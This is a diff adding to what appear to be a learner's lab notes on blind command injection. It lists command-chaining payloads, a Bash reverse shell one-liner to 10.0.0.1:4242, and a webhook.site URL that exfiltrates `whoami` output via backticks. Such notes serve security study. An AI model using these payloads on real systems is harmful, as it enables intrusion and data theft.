@@ -169,15 +169,68 @@ Command : window.location.href
 ```
 
 
-
+<hr>
 
 - [ ] Command Injection - Blind
 
+
+Basic command chaining
+```
+; ls -la
+```
+
+
+Using logic operators
+```
+&& ls -la
+```
+
+
+Commenting out the rest of a command
+```
+; ls -la #
+```
+
+
+Using a pipe for command chaining
+```
+| ls -la
+```
+
+
+>[!warning] Let's see if we can pop a shell
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+Will try the Bash TCP:
+```
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+```
+
+but to know the bash path will run the command
+```
+which/bash
+```
+
+### Blind Injecion
+
+It look's like a this is blind comman injection
+So will use Weekhook.site and will use back tick `` to run the command
+https://webhook.site/e0edf9f6-fb9d-4bda-9d7c-22fbf2a697c3?``
+
+```
+https://webhook.site/e0edf9f6-fb9d-4bda-9d7c-22fbf2a697c3?`whoami`
+```
+
+
 - [ ] Insecure File Upload - Basic | Magic Bytes
+
 
 - [ ] Authentication - Brute Force | MFA
 
+
 - [ ] XXE
 
+
 - [ ] IDOR
+
 
